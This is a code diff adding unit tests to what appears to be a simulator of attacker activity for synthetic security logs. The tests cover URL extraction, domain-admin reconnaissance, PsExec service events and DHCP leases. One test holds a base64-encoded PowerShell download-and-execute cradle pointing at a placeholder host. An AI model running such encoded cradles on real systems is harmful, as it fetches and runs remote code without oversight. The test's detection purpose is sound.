@@ -20,6 +20,14 @@ class TestStorylineCommandNetworks:
 
         assert url == "https://cdn.example.test/stage.ps1"
 
+    def test_extract_http_url_from_encoded_powershell_download(self):
+        url = StorylineMixin._extract_http_url(
+            "powershell.exe -NoProfile -EncodedCommand "
+            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcwB0AGEAZwBlAC4AcABzADEAIgApAA=="
+        )
+
+        assert url == "https://cdn.example.test/stage.ps1"
+
     def test_parse_http_url_target_accepts_valid_url(self):
         target = StorylineMixin._parse_http_url_target("https://cdn.example.test:8443/stage.ps1")
 
@@ -68,6 +76,9 @@ class _FakeActivityGenerator:
     def __init__(self) -> None:
         self.reserved_ports: list[int] = []
         self.connections: list[dict] = []
+        self.explicit_credentials: list[dict] = []
+        self.processes: list[dict] = []
+        self.dhcp_leases: list[dict] = []
 
     def generate_bash_command(self, *args: Any, **kwargs: Any) -> None:
         return None
@@ -76,7 +87,11 @@ class _FakeActivityGenerator:
         return 1
 
     def generate_process(self, *args: Any, **kwargs: Any) -> int:
+        self.processes.append(kwargs)
         return 4242
+
+    def generate_logon(self, *args: Any, **kwargs: Any) -> str:
+        return "0xabc"
 
     def _record_user_process(self, *args: Any, **kwargs: Any) -> None:
         return None
@@ -88,6 +103,15 @@ class _FakeActivityGenerator:
     def generate_connection(self, **kwargs: Any) -> str:
         self.connections.append(kwargs)
         return "Cscptransfer00001"
+
+    def generate_explicit_credentials(self, **kwargs: Any) -> None:
+        self.explicit_credentials.append(kwargs)
+
+    def generate_dhcp_lease(self, **kwargs: Any) -> None:
+        self.dhcp_leases.append(kwargs)
+
+    def _expand_and_emit(self, *args: Any, **kwargs: Any) -> None:
+        return None
 
 
 class _FakeStateManager:
@@ -148,3 +172,117 @@ class TestStorylineScpCorrelation:
         assert engine.activity_generator.reserved_ports == [45678]
         assert engine.activity_generator.connections[0]["src_port"] == 45678
         assert receiver_ports == [45678]
+
+    def test_net_domain_queries_do_not_auto_emit_4648(self):
+        source = System(
+            hostname="SRC",
+            ip="10.10.0.10",
+            os="Windows 10",
+            type="workstation",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        spec = SimpleNamespace(
+            type="process",
+            process_name="net.exe",
+            command_line='net group "Domain Admins" /domain',
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="query domain admins",
+            explicit_types={"process"},
+        )
+
+        assert engine.activity_generator.explicit_credentials == []
+
+    def test_service_backed_process_does_not_emit_second_payload_file_create(self):
+        source = System(
+            hostname="DC-01",
+            ip="10.10.0.10",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\System32\PSEXESVC.exe",
+            command_line="PSEXESVC.exe -accepteula",
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="start service",
+            explicit_types={"process", "service_installed"},
+        )
+
+        assert engine.activity_generator.processes[0]["ensure_file_event"] is False
+
+    def test_storyline_dhcp_lease_reuses_existing_host_lease_identity(self):
+        source = System(
+            hostname="ROGUE-LAPTOP",
+            ip="10.10.1.99",
+            os="Kali Linux",
+            type="workstation",
+        )
+        actor = User(
+            username="root",
+            full_name="Root",
+            email="root@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(environment=SimpleNamespace(systems=[source]))
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        engine._infra_ips = {"dc": ["10.10.2.10"]}
+        engine._dhcp_lease_state = {
+            "ROGUE-LAPTOP": {
+                "mac": "f0:1f:af:b7:35:b2",
+                "lease_time": 7200.0,
+                "last_renewal": 1710763200.0,
+                "system": source,
+            }
+        }
+        spec = SimpleNamespace(type="dhcp_lease", requested_ip=None, mac_address=None)
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="renew lease",
+            explicit_types={"dhcp_lease"},
+        )
+
+        lease = engine.activity_generator.dhcp_leases[0]
+        assert lease["mac"] == "f0:1f:af:b7:35:b2"
+        assert lease["lease_time"] == 7200.0
+        assert lease["msg_types"] == ["REQUEST", "ACK"]
